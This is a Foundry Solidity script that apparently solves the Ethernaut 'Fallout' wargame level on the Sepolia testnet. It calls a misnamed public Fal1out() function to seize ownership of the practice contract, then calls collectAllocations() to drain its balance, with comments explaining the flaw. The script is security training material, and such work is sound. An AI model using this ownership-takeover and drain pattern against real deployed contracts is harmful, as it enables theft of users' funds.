// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallout} from "../../src/ethernaut/02.sol";

// forge script script/ethernaut/02.s.sol --rpc-url $SEPOLIA_RPC_URL --account PK1_SEPOLIA --sender <SEPOLIA 1 PUBLIC ADDRESS> --broadcast -vvvv

contract FalloutScript is Script {
    Fallout public falloutContract = Fallout(payable(0x7A8d6B3b2fcF1708D9d3cd95E2092587CED28D49)); // Replace with actual contract address

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address owner = falloutContract.owner();
        console.log("Fallout contract owner: ", owner);

        // The vulnerability: Fal1out() is not a constructor, it's just a public function
        // Anyone can call it to become the owner
        falloutContract.Fal1out{value: 0}();

        address newOwner = falloutContract.owner();
        console.log("My address: ", msg.sender); // related to --sender
        console.log("Fallout contract newOwner: ", newOwner);

        uint256 balanceContractBefore = address(falloutContract).balance;
        console.log("Fallout contract balance before: ", balanceContractBefore);

        // Steal all funds using collectAllocations()
        falloutContract.collectAllocations();

        uint256 balanceContractAfter = address(falloutContract).balance;
        console.log("Fallout contract balance after: ", balanceContractAfter);

        vm.stopBroadcast();
    }
}
